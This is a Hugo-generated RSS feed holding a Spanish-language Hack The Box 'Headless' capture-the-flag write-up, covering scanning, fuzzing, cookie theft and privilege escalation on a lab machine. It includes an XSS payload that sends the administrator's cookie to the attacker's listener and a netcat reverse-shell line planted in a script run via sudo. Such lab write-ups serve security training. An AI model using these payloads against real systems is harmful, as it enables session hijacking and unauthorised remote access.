@@ -1,0 +1,165 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Easy HTB on Gabriel Dueck</title>
+        <link>http://localhost:1313/categories/easy-htb/</link>
+        <description>Recent content in Easy HTB on Gabriel Dueck</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <lastBuildDate>Tue, 27 Aug 2024 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/easy-htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Headless Writeup</title>
+        <link>http://localhost:1313/p/headless-writeup/</link>
+        <pubDate>Tue, 27 Aug 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/headless-writeup/</guid>
+        <description>&lt;img src="http://localhost:1313/p/headless-writeup/featured1.png" alt="Featured image of post Headless Writeup" /&gt;&lt;h3 id=&#34;nmap&#34;&gt;nmap
+&lt;/h3&gt;&lt;p&gt;realizamos un escaneo con Nmap y encontramos estos puertos abiertos&lt;/p&gt;
+&lt;img src=&#34;featured2.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;web&#34;&gt;web
+&lt;/h4&gt;&lt;p&gt;accedemos al sitio web&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;no encontramos nada, vamos hacer fuzzing a la web&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;featured3.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;fuzzing&#34;&gt;fuzzing
+&lt;/h4&gt;&lt;p&gt;realizamos un escaneo con gobuster, usamos el comando&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;encontramos el dominio /support&lt;/p&gt;
+&lt;img src=&#34;featured4.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;burpsuite&#34;&gt;burpsuite
+&lt;/h4&gt;&lt;p&gt;rellenamos el campo con cualquier informacion&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;vamos interceptar las peticiones con &lt;strong&gt;Burpsuite&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;featured5.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;esta es la peticion con &lt;strong&gt;Burpsuite&lt;/strong&gt;&lt;/p&gt;
+&lt;img src=&#34;featured6.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;en otra terminal los colocamos en escucha&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -m http.server 80
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;featured7.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;script&#34;&gt;script
+&lt;/h4&gt;&lt;p&gt;vamos a robarnos las cookies de Administrador&lt;/p&gt;
+&lt;p&gt;utilizando este script&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&amp;lt;tu ip&amp;gt; :8001/?cookie=&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;btoa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;featured8.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;lo colocamos de esta manera el script que previamente creamos&lt;/p&gt;
+&lt;img src=&#34;featured9.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;base64&#34;&gt;base64
+&lt;/h4&gt;&lt;p&gt;vamos al servidor que nos colocamos en escucha y conseguimos la cookie de sesion
+pero la cookie esta en base64 vamos a descodearla&lt;/p&gt;
+&lt;img src=&#34;featured10.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;cookie&#34;&gt;cookie
+&lt;/h4&gt;&lt;p&gt;usamos este comando&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=&amp;#34; | base64 -d 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;la conseguimos&lt;/p&gt;
+&lt;img src=&#34;featured11.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;vamos a la pagina y inspeccionamos nos dirigimos a &lt;strong&gt;storage&lt;/strong&gt; luego a &lt;strong&gt;cookies&lt;/strong&gt; y la colocamos,&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;recuerden refrescar la pagina&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;featured12.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;al momento de recargar nos dara acceso al dashboard&lt;/p&gt;
+&lt;img src=&#34;featured14.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;payload&#34;&gt;payload
+&lt;/h4&gt;&lt;p&gt;creamos un payload&lt;/p&gt;
+&lt;img src=&#34;featured13.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;interceptamos la peticion a la web&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;colocaremos el payload&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;antes de mandar la peticion por Burpsuite recordemos colocarnos en escucha&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;featured16.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;img src=&#34;featured15.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;burpsuite-1&#34;&gt;Burpsuite
+&lt;/h4&gt;&lt;p&gt;mandamos la peticion con Burpsuite y conseguimos una shell&lt;/p&gt;
+&lt;img src=&#34;featured17.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;p&gt;flag de user conseguida&lt;/p&gt;
+&lt;img src=&#34;featured18.png&#34; alt=&#34;Featured Image&#34;&gt;
+---
+&lt;p&gt;vamos utilizar el comando sudo -l para verificar el uso de permisos en el usuario en el cual nos encontramos&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo -l 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;nos fijamos que podemos usar&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;/usr/bin/syscheck&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;featured19.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;abuso-de-archivo&#34;&gt;abuso de archivo
+&lt;/h4&gt;&lt;p&gt;hacemos cat a la ruta&lt;/p&gt;
+&lt;p&gt;Vemos que el archivo initdb.sh se está lanzando, por lo que lo que podemos hacer es poner una carga útil en ese archivo&lt;/p&gt;
+&lt;img src=&#34;featured20.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;nc -e /bin/sh 10.10.14.132 1212&amp;#34; &amp;gt; initdb.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod +x initdb.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /usr/bin/syscheck
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;featured21.png&#34; alt=&#34;Featured Image&#34;&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;shell&#34;&gt;shell
+&lt;/h4&gt;&lt;p&gt;en otra terminal nos colocamos en escucha y listo conseguimos la shell&lt;/p&gt;
+&lt;img src=&#34;featured22.png&#34; alt=&#34;Featured Image&#34;&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
